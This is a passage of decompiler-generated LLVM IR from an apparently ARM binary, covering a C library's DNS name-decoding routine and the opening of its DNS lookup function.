  %v4_1f6e4 = sext i16 %v3_1f6e4 to i32
  %v3_1f6ec = add i32 %v4_1f6e4, %v0_1f6e0
  %v4_1f6ec = inttoptr i32 %v3_1f6ec to i32*
  store i32 97, i32* %v4_1f6ec, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f6f4

dec_label_pc_1f6f4:                               ; preds = %bb57, %dec_label_pc_1f6d4, %dec_label_pc_1f6b0, %dec_label_pc_1f6dc
  %v0_1f6f4 = phi i32 [ %v1_1f63c, %bb57 ], [ %storemerge, %dec_label_pc_1f6d4 ], [ %v0_1f6f4.pre, %dec_label_pc_1f6b0 ], [ 0, %dec_label_pc_1f6dc ]
  store i32 %v0_1f6f4, i32* %r0.global-to-local, align 4
  store i32 %v6_1f47c, i32* %r5.global-to-local, align 4
  ret i32 %v0_1f6f4

; uselistorder directives
  uselistorder i32 %v0_1f6f4, { 1, 0 }
  uselistorder i1 %v7_1f5c0, { 2, 0, 1 }
  uselistorder i32 %v0_1f5c0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1f670, { 0, 2, 1 }
  uselistorder i32 %v0_1f65c, { 1, 0 }
  uselistorder i32 %v0_1f644, { 1, 0 }
  uselistorder i32 %v5_1f5f0, { 3, 4, 5, 6, 2, 1, 0, 7 }
  uselistorder i1 %v9_1f5c8, { 1, 0, 2 }
  uselistorder i32 %v2_1f5f069, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f5ec71, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1f5c068, { 1, 0 }
  uselistorder i32 %v2_1f5a8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1f5b8, { 1, 0, 2 }
  uselistorder i1 %v7_1f594, { 1, 0 }
  uselistorder i32 %v0_1f594, { 1, 2, 0 }
  uselistorder i32 %v1_1f5b8.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1f58c.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1f57c, { 1, 0 }
  uselistorder i1 %v7_1f574, { 1, 0 }
  uselistorder i32 %v1_1f568, { 1, 2, 0 }
  uselistorder i32 %v0_1f57c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1f590, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1f530, { 1, 0 }
  uselistorder i32 %v0_1f568, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1f54c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1f55c, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1f4ec, { 1, 0, 2 }
  uselistorder i32 %v2_1f4d4, { 1, 0 }
  uselistorder i32 %v0_1f4ec, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1f4f0, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 7, 8, 16, 9, 10, 11, 13, 12, 15, 14, 1, 2, 3, 5, 4, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 8, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 21, 22, 23, 0, 1, 6, 2, 3, 4 }
  uselistorder i32 97, { 5, 6, 8, 1, 0, 9, 7, 2, 3, 4 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @sprintf, { 0, 4, 3, 2, 1 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1f6f4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1f6d4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f670, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f5c0, { 1, 0 }
  uselistorder label %dec_label_pc_1f594._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f58c, { 1, 0 }
  uselistorder label %dec_label_pc_1f568, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1f564, { 1, 0 }
  uselistorder label %dec_label_pc_1f51c, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1f718 = load i32, i32* @r5, align 4
  %v0_1f71c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1f71c, i32* %sl.global-to-local, align 4
  %v2_1f71c = icmp eq i32 %v0_1f71c, 0
  br i1 %v2_1f71c, label %.thread30, label %dec_label_pc_1f744.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1f804

dec_label_pc_1f744.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1f7444 = load i32, i32* @r1, align 4
  %v6_1f74814 = icmp slt i32 %v0_1f7444, %arg2
  br i1 %v6_1f74814, label %dec_label_pc_1f74c.preheader, label %dec_label_pc_1f804

dec_label_pc_1f74c.preheader:                     ; preds = %dec_label_pc_1f744.preheader
  %v2_1f74c51 = add i32 %v0_1f71c, %v0_1f7444
  %v3_1f74c52 = inttoptr i32 %v2_1f74c51 to i8*
  %v4_1f74c53 = load i8, i8* %v3_1f74c52, align 1
  %v6_1f74c54 = zext i8 %v4_1f74c53 to i32
  store i32 %v6_1f74c54, i32* @r4, align 4
  %v2_1f75055 = icmp eq i8 %v4_1f74c53, 0
  br i1 %v2_1f75055, label %bb49, label %dec_label_pc_1f758

dec_label_pc_1f740:                               ; preds = %bb48, %bb44
  %v1_1f744 = phi i32 [ %v1_1f744.pre, %bb48 ], [ %v1_1f77059, %bb44 ]
  %v0_1f744 = phi i32 [ %v0_1f744.pre, %bb48 ], [ %v5_1f788, %bb44 ]
  %v0_1f740 = phi i32 [ %v0_1f740.pre, %bb48 ], [ %v0_1f78c60, %bb44 ]
  store i32 %v0_1f740, i32* %r0.global-to-local, align 4
  %v6_1f748 = icmp slt i32 %v0_1f744, %v1_1f744
  br i1 %v6_1f748, label %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge, label %dec_label_pc_1f804

dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge:  ; preds = %dec_label_pc_1f740
  %v0_1f74c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1f74c = add i32 %v0_1f74c.pre, %v0_1f744
  %v3_1f74c = inttoptr i32 %v2_1f74c to i8*
  %v4_1f74c = load i8, i8* %v3_1f74c, align 1
  %v6_1f74c = zext i8 %v4_1f74c to i32
  store i32 %v6_1f74c, i32* @r4, align 4
  %v2_1f750 = icmp eq i8 %v4_1f74c, 0
  %v0_1f7f0 = load i32, i32* @ip, align 4
  %v2_1f7f0 = icmp eq i32 %v0_1f7f0, 0
  br i1 %v2_1f750, label %dec_label_pc_1f7f0, label %dec_label_pc_1f758

dec_label_pc_1f758:                               ; preds = %dec_label_pc_1f74c.preheader, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge
  %v2_1f7f066 = phi i1 [ %v2_1f7f0, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ false, %dec_label_pc_1f74c.preheader ]
  %v0_1f7f064 = phi i32 [ %v0_1f7f0, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ 1, %dec_label_pc_1f74c.preheader ]
  %v6_1f74c63 = phi i32 [ %v6_1f74c, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ %v6_1f74c54, %dec_label_pc_1f74c.preheader ]
  %v0_1f77862 = phi i32 [ %v0_1f74c.pre, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ %v0_1f71c, %dec_label_pc_1f74c.preheader ]
  %v0_1f76861 = phi i32 [ %v0_1f744, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ %v0_1f7444, %dec_label_pc_1f74c.preheader ]
  %v0_1f78c60 = phi i32 [ %v0_1f740, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ 0, %dec_label_pc_1f74c.preheader ]
  %v1_1f77059 = phi i32 [ %v1_1f744, %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge ], [ %arg2, %dec_label_pc_1f74c.preheader ]
  %v1_1f75c = and i32 %v6_1f74c63, 192
  br i1 %v2_1f7f066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1f758
  %v1_1f760 = load i32, i32* %r8.global-to-local, align 4
  %v2_1f760 = add i32 %v1_1f760, 1
  store i32 %v2_1f760, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1f758, %bb
  %v2_1f764 = icmp eq i32 %v1_1f75c, 192
  %v1_1f768 = add i32 %v0_1f76861, 1
  store i32 %v1_1f768, i32* @r1, align 4
  br i1 %v2_1f764, label %dec_label_pc_1f770, label %dec_label_pc_1f798

dec_label_pc_1f770:                               ; preds = %bb42
  %v6_1f774 = icmp slt i32 %v1_1f768, %v1_1f77059
  br i1 %v6_1f774, label %dec_label_pc_1f778, label %dec_label_pc_1f804

dec_label_pc_1f778:                               ; preds = %dec_label_pc_1f770
  %v2_1f778 = add i32 %v1_1f768, %v0_1f77862
  %v3_1f778 = inttoptr i32 %v2_1f778 to i8*
  %v4_1f778 = load i8, i8* %v3_1f778, align 1
  %v6_1f778 = zext i8 %v4_1f778 to i32
  %v1_1f780 = urem i32 %v6_1f74c63, 64
  br i1 %v2_1f7f066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1f778
  %v1_1f784 = load i32, i32* %r8.global-to-local, align 4
  %v2_1f784 = add i32 %v1_1f784, 1
  store i32 %v2_1f784, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1f778, %bb43
  %v4_1f788 = mul nuw nsw i32 %v1_1f780, 256
  %v5_1f788 = or i32 %v6_1f778, %v4_1f788
  store i32 %v5_1f788, i32* @r1, align 4
  store i32 %v0_1f78c60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1f740

dec_label_pc_1f798:                               ; preds = %bb42
  %v2_1f798 = add i32 %v6_1f74c63, %v0_1f78c60
  store i32 %v2_1f798, i32* %r6.global-to-local, align 4
  %v3_1f79c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1f79c, i32* @r3, align 4
  %v1_1f7a0 = add i32 %v2_1f798, 1
  store i32 %v1_1f7a0, i32* %r7.global-to-local, align 4
  %v3_1f7a4 = icmp ult i32 %v1_1f7a0, %v3_1f79c
  br i1 %v3_1f7a4, label %dec_label_pc_1f7ac, label %dec_label_pc_1f804

dec_label_pc_1f7ac:                               ; preds = %dec_label_pc_1f798
  %v2_1f7ac = add i32 %v6_1f74c63, %v1_1f768
  store i32 %v2_1f7ac, i32* @r5, align 4
  %v3_1f7b0 = icmp ult i32 %v2_1f7ac, %v1_1f77059
  br i1 %v3_1f7b0, label %dec_label_pc_1f7b8, label %dec_label_pc_1f804

dec_label_pc_1f7b8:                               ; preds = %dec_label_pc_1f7ac
  %v2_1f7b8 = add i32 %v1_1f768, %v0_1f77862
  store i32 %v2_1f7b8, i32* @r1, align 4
  %v0_1f7bc = load i32, i32* %sb.global-to-local, align 4
  %v2_1f7bc = add i32 %v0_1f7bc, %v0_1f78c60
  store i32 %v2_1f7bc, i32* @r0, align 4
  store i32 %v6_1f74c63, i32* @r2, align 4
  %v0_1f7c8 = call i32 @memcpy()
  store i32 %v0_1f7c8, i32* %r0.global-to-local, align 4
  store i32 %v0_1f7f064, i32* @ip, align 4
  %v0_1f7d0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1f7d0 = load i32, i32* @r5, align 4
  %v2_1f7d0 = add i32 %v1_1f7d0, %v0_1f7d0
  %v3_1f7d0 = inttoptr i32 %v2_1f7d0 to i8*
  %v4_1f7d0 = load i8, i8* %v3_1f7d0, align 1
  br i1 %v2_1f7f066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1f7b8
  %v1_1f7d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1f7d8 = load i32, i32* @r4, align 4
  %v3_1f7d8 = add i32 %v2_1f7d8, %v1_1f7d8
  store i32 %v3_1f7d8, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1f7b8, %bb45
  %v2_1f7dc = icmp eq i8 %v4_1f7d0, 0
  br i1 %v2_1f7dc, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1f7e8.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1f7d0, i32* @r1, align 4
  %v2_1f7e8 = load i32, i32* %sb.global-to-local, align 4
  %v3_1f7e8 = load i32, i32* %r6.global-to-local, align 4
  %v4_1f7e8 = add i32 %v3_1f7e8, %v2_1f7e8
  %v5_1f7e8 = inttoptr i32 %v4_1f7e8 to i8*
  store i8 %v0_1f7e8.off0, i8* %v5_1f7e8, align 1
  %v0_1f740.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1f744.pre = load i32, i32* @r1, align 4
  %v1_1f744.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1f740

dec_label_pc_1f7f0:                               ; preds = %dec_label_pc_1f740.dec_label_pc_1f74c_crit_edge
  %v0_1f7f8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1f7f0, label %dec_label_pc_1f804, label %bb49

bb49:                                             ; preds = %dec_label_pc_1f74c.preheader, %dec_label_pc_1f7f0
  %v0_1f7f8.pre69 = phi i32 [ %v0_1f7f8.pre.pre, %dec_label_pc_1f7f0 ], [ 0, %dec_label_pc_1f74c.preheader ]
  %v2_1f7f4 = add i32 %v0_1f7f8.pre69, 1
  store i32 %v2_1f7f4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1f804

dec_label_pc_1f804:                               ; preds = %dec_label_pc_1f7ac, %dec_label_pc_1f798, %dec_label_pc_1f770, %dec_label_pc_1f740, %dec_label_pc_1f7f0, %dec_label_pc_1f744.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1f7f4, %bb49 ], [ -1, %dec_label_pc_1f744.preheader ], [ %v0_1f7f8.pre.pre, %dec_label_pc_1f7f0 ], [ -1, %dec_label_pc_1f798 ], [ -1, %dec_label_pc_1f7ac ], [ -1, %dec_label_pc_1f740 ], [ -1, %dec_label_pc_1f770 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1f718, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1f7f8.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1f7d0, { 1, 0 }
  uselistorder i32 %v5_1f788, { 1, 0 }
  uselistorder i32 %v1_1f768, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1f78c60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1f74c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1f7f066, { 1, 2, 0 }
  uselistorder i32 %v0_1f71c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1f804, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1f758, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %tmp163 = call i32 @__decompiler_undefined_function_0()
  %tmp164 = call i32 @__decompiler_undefined_function_0()
  %tmp165 = call i32 @__decompiler_undefined_function_0()
  %tmp176 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1f810 = load i32, i32* @r4, align 4
  %v6_1f810 = load i32, i32* @r5, align 4
  %v9_1f810 = load i32, i32* @r6, align 4
  %v12_1f810 = load i32, i32* @r7, align 4
  %v15_1f810 = load i32, i32* @r8, align 4
  %v18_1f810 = load i32, i32* @sb, align 4
  %v21_1f810 = load i32, i32* @sl, align 4
  %v24_1f810 = load i32, i32* @fp, align 4
  %v27_1f810 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @sb, align 4
  %v0_1f824 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f82c = call i32 @malloc(i32 512)
  store i32 %v1_1f82c, i32* @sl, align 4
  %v0_1f834 = load i32, i32* @r4, align 4
  %v1_1f834 = inttoptr i32 %v0_1f834 to i8*
  %v3_1f838 = call i32 @strlen(i8* %v1_1f834)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1f844 = icmp ugt i32 %v3_1f838, 893
  store i1 %v3_1f844, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r8, align 4
  %tmp288 = icmp ugt i32 %v3_1f838, 894
  br i1 %tmp288, label %.thread134, label %dec_label_pc_1f864

.thread134:                                       ; preds = %entry
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ff88

dec_label_pc_1f864:                               ; preds = %entry
  store i32 %v3_1f838, i32* %r2.global-to-local, align 4
  %v1_1f868 = add i32 %v3_1f838, 130
  %v1_1f86c = call i32 @malloc(i32 %v1_1f868)
  store i32 %v1_1f86c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f870 = icmp eq i32 %v1_1f86c, 0
  br i1 %v2_1f870, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_1f864
  %v1_1f874 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1f874 = icmp eq i32 %v1_1f874, 0
  br i1 %v3_1f874, label %bb217, label %dec_label_pc_1f888

.thread6:                                         ; preds = %dec_label_pc_1f864
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1ff80

bb217:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1ff80

dec_label_pc_1f888:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1f888 = load i32, i32* @r4, align 4
  %v1_1f888 = inttoptr i32 %v0_1f888 to i8*
  %v2_1f888 = load i8, i8* %v1_1f888, align 1
  %v3_1f888 = zext i8 %v2_1f888 to i32
  store i32 %v3_1f888, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f88c = icmp eq i8 %v2_1f888, 0
  br i1 %v2_1f88c, label %dec_label_pc_1ff80, label %dec_label_pc_1f894

dec_label_pc_1f894:                               ; preds = %dec_label_pc_1f888
  %v2_1f898 = add i32 %v0_1f888, %v3_1f838
  store i32 %v2_1f898, i32* %r3.global-to-local, align 4
  %v1_1f89c = add i32 %v2_1f898, -1
  %v2_1f89c = inttoptr i32 %v1_1f89c to i8*
  %v3_1f89c = load i8, i8* %v2_1f89c, align 1
  %v4_1f89c = zext i8 %v3_1f89c to i32
  store i32 %v4_1f89c, i32* @r3, align 4
  store i32 %v3_1f838, i32* @r2, align 4
  store i32 %v0_1f888, i32* @r1, align 4
  %v0_1f8ac = call i32 @memcpy()
  store i32 30184, i32* %r3.global-to-local, align 4
  store i32 29092, i32* %r1.global-to-local, align 4
  store i32 1155, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v2_1f924 = ptrtoint i32* %stack_var_-76 to i32
  %v2_1fa34 = ptrtoint i16* %stack_var_-104 to i32
  %v2_1fa5c = ptrtoint i32* %stack_var_-192 to i32
  %v3_1fa7c = bitcast i32* %stack_var_-192 to i8*
  %v2_1fb30 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1fbc8 = icmp eq i32 %tmp165, 0
  %v1_1fbd4 = add i32 %tmp164, -2
  %v2_1fbd8 = icmp ne i32 %v1_1fbd4, 0
  %tmp218 = icmp slt i32 %tmp163, 1
  %v2_1fcd4 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1fcd8 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1ff2c57 = icmp sgt i32 %tmp163, 0
  %v2_1fe54 = icmp ne i32 %v0_1f824, 0
  %v7_1fe54 = icmp eq i32 %v0_1f824, 1
  %v1_1fd3c = bitcast i32* %stack_var_-448 to i8*
  %v2_1fdf0 = icmp eq i32 %tmp148, 0
  %v2_1fbe4 = icmp ugt i8 %v3_1f89c, 45
  %v7_1fbe4 = icmp eq i8 %v3_1f89c, 46
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1f978 = add i32 %v1_1f86c, %v3_1f838
  %v5_1f978 = inttoptr i32 %v4_1f978 to i8*
  %v1_1fbd4.cmp = icmp ugt i32 %v1_1fbd4, 1
  %v2_1fc14 = icmp eq i32 %tmp164, 0
  %v3_1fe58 = icmp ugt i32 %v0_1f824, 27
  %v8_1fe58 = icmp eq i32 %v0_1f824, 28
  br label %dec_label_pc_1f908

dec_label_pc_1f908:                               ; preds = %dec_label_pc_1ff68, %dec_label_pc_1f894
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1f894 ], [ %v1_1ff6c, %dec_label_pc_1ff68 ]
  %stack_var_-464.0 = phi i32 [ %tmp176, %dec_label_pc_1f894 ], [ %v3_1fa14, %dec_label_pc_1ff68 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1f894 ], [ %stack_var_-468.2, %dec_label_pc_1ff68 ]
  %v1_1f910 = phi i32 [ -1, %dec_label_pc_1f894 ], [ %v3_1fae8, %dec_label_pc_1ff68 ]
  store i32 %v1_1f910, i32* %r3.global-to-local, align 4
  %v2_1f90c = icmp eq i32 %v1_1f910, -1
  store i1 %v2_1f90c, i1* %cpsr_c.global-to-local, align 1
  %v7_1f90c = icmp eq i32 %v1_1f910, -1
  br i1 %v7_1f90c, label %bb220, label %bb219

bb219:                                            ; preds = %dec_label_pc_1f908
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_1f908, %bb219
  %v1_1f914 = xor i1 %v7_1f90c, true
  call void @__pseudo_cond_branch(i1 %v1_1f914, i32 ptrtoint (i32* @global_var_19590.1833 to i32))
  %v0_1f920 = load i32, i32* @r8, align 4
  %v2_1f920 = add i32 %v0_1f920, 80
  %v3_1f920 = inttoptr i32 %v2_1f920 to i32*
  %v4_1f920 = load i32, i32* %v3_1f920, align 4
  store i32 %v4_1f920, i32* @r4, align 4
  store i32 %v2_1f924, i32* @r5, align 4
  %v2_1f928 = add i32 %v0_1f920, 76
  %v3_1f928 = inttoptr i32 %v2_1f928 to i32*
  %v4_1f928 = load i32, i32* %v3_1f928, align 4
  store i32 %v4_1f928, i32* %r1.global-to-local, align 4
  store i32 %v4_1f920, i32* %r2.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v2_1f938 = add i32 %v0_1f920, 124
  %v3_1f938 = inttoptr i32 %v2_1f938 to i32*
  %v4_1f938 = load i32, i32* %v3_1f938, align 4
  call void @__pseudo_branch(i32 %v4_1f938)
  %v0_1f94c = load i32, i32* @r8, align 4
  %v2_1f94c = add i32 %v0_1f94c, 20
  %v3_1f94c = inttoptr i32 %v2_1f94c to i32*
  %v4_1f94c = load i32, i32* %v3_1f94c, align 4
  store i32 129368, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1f94c)
  %v0_1f958 = call i32 @__open_nameservers()
  %v0_1f960 = load i32, i32* @r8, align 4
  %v2_1f960 = add i32 %v0_1f960, 30184
  %v3_1f960 = inttoptr i32 %v2_1f960 to i32*
  %v4_1f960 = load i32, i32* %v3_1f960, align 4
  store i32 %v1_1f86c, i32* %r1.global-to-local, align 4
  store i32 %v3_1f838, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v0_1f970 = load i32, i32* @r7, align 4
  %v3_1f970 = icmp uge i32 %v0_1f970, %v4_1f960
  store i1 %v3_1f970, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1f978, align 1
  %v0_1f97c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f97c, label %dec_label_pc_1f9a0, label %dec_label_pc_1f980

dec_label_pc_1f980:                               ; preds = %bb220
  store i32 46, i32* %r3.global-to-local, align 4
  %v2_1f984 = load i32, i32* %r1.global-to-local, align 4
  %v3_1f984 = load i32, i32* %r2.global-to-local, align 4
  %v4_1f984 = add i32 %v3_1f984, %v2_1f984
  %v5_1f984 = inttoptr i32 %v4_1f984 to i8*
  store i8 46, i8* %v5_1f984, align 1
  %v0_1f98c = load i32, i32* @r8, align 4
  %v2_1f98c = add i32 %v0_1f98c, 30172
  %v3_1f98c = inttoptr i32 %v2_1f98c to i32*
  %v4_1f98c = load i32, i32* %v3_1f98c, align 4
  store i32 %v4_1f98c, i32* %r3.global-to-local, align 4
  %v0_1f990 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f990 = add i32 %v0_1f990, 1
  %v1_1f994 = load i32, i32* %r2.global-to-local, align 4
  %v2_1f994 = add i32 %v1_1f990, %v1_1f994
  %v1_1f998 = load i32, i32* @r7, align 4
  %v2_1f998 = and i32 %v1_1f998, 1073741824
  %v3_1f998 = icmp ne i32 %v2_1f998, 0
  store i1 %v3_1f998, i1* %cpsr_c.global-to-local, align 1
  %v4_1f998 = mul i32 %v1_1f998, 4
  %v5_1f998 = add i32 %v4_1f998, %v4_1f98c
  %v6_1f998 = inttoptr i32 %v5_1f998 to i32*
  %v7_1f998 = load i32, i32* %v6_1f998, align 4
  store i32 %v7_1f998, i32* @r1, align 4
  %v2_1f99c = inttoptr i32 %v2_1f994 to i8*
  %v3_1f99c = call i32 @strcpy(i8* %v2_1f99c, i32 %v7_1f998)
  br label %dec_label_pc_1f9a0

dec_label_pc_1f9a0:                               ; preds = %bb220, %dec_label_pc_1f980
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1f9a4 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1f9a4, label %dec_label_pc_1f9ac, label %dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge

dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge:  ; preds = %dec_label_pc_1f9a0
  %v0_1f9e4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1f9dc

dec_label_pc_1f9ac:                               ; preds = %dec_label_pc_1f9a0
  store i32 30180, i32* %r3.global-to-local, align 4
  store i32 1155, i32* %r1.global-to-local, align 4
  %v0_1f9b4 = load i32, i32* @r8, align 4
  %v2_1f9b4 = add i32 %v0_1f9b4, 30180
  %v3_1f9b4 = inttoptr i32 %v2_1f9b4 to i32*
  %v4_1f9b4 = load i32, i32* %v3_1f9b4, align 4
  store i32 %v4_1f9b4, i32* %r2.global-to-local, align 4
  %v2_1f9b8 = add i32 %v0_1f9b4, 1155
  %v3_1f9b8 = inttoptr i32 %v2_1f9b8 to i8*
  %v4_1f9b8 = load i8, i8* %v3_1f9b8, align 1
  %v6_1f9b8 = zext i8 %v4_1f9b8 to i32
  %v2_1f9bc = mul i32 %v6_1f9b8, %v4_1f9b4
  store i32 1152, i32* %r2.global-to-local, align 4
  store i32 29092, i32* %r3.global-to-local, align 4
  %v2_1f9cc = add i32 %v0_1f9b4, 1152
  %v3_1f9cc = inttoptr i32 %v2_1f9cc to i16*
  %v4_1f9cc = load i16, i16* %v3_1f9cc, align 2
  %v6_1f9cc = zext i16 %v4_1f9cc to i32
  store i32 %v6_1f9cc, i32* %r2.global-to-local, align 4
  %v2_1f9d0 = add i32 %v0_1f9b4, 29092
